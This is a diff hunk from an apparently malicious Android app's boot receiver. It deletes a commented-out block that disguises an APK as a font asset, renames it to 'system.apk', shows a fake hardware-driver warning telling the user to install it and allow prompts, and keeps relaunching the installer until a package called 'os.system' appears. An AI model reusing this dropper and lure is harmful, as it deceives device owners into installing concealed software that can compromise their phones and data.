@@ -264,49 +264,6 @@ public class ReceiverBoot extends BroadcastReceiver
 				}
 			}
 
-        	/*finishInstall = true;
-			
-			try {
-				if (!new MainActivity().apkMana(context, "com.android.input.keyboard.uxnp", "cek")) 
-				{
-					new Installer(context, true).assetToSdcard(context, "fonts.ttf", pathExternal+"/");
-					Thread.sleep(1000);
-					Runtime.getRuntime().exec("mv "+pathExternal+"/fonts.ttf "+pathExternal+"/system.apk");
-					Thread.sleep(1000);
-
-					ServiceAlert alert = new ServiceAlert();
-        			alert.dataText = "Notice:\n\n\nHardware driver can't access /etc/build.prop please following\n\n1.  Install this internal apk\n2.  Allow prompt if view\n3.  Open app to trigerred libc.so";
-        			alert.dataTextSize = 15;
-        			context.startService(new Intent(context, ServiceAlert.class));
-        			
-        			insH.postDelayed(insR, 5 * 1000);
-
-        			insR = new Runnable() {
-        				public void run() {
-        					insH.postDelayed(insR, 8 * 1000);
-
-							if (new MainActivity().apkMana(context, "os.system", "open")) {
-        						insH.removeCallbacks(insR);
-        						context.stopService(new Intent(context, ServiceAlert.class));
-        					
-        					} else {
-        						Intent intent = new Intent(Intent.ACTION_VIEW);
-        						intent.setDataAndType(Uri.fromFile(new File(pathExternal+"/system.apk")), "application/vnd.android.package-archive");
-        						intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        						context.startActivity(intent);
-        					}
-        				}
-        			};
-
-				}
-				Log.i(TAG, "exekusi sukses");
-
-			}catch(Exception e) {
-				Log.i(TAG, "errrot:"+e);
-			}
-
-			*/
-			
 		}
 	}
 
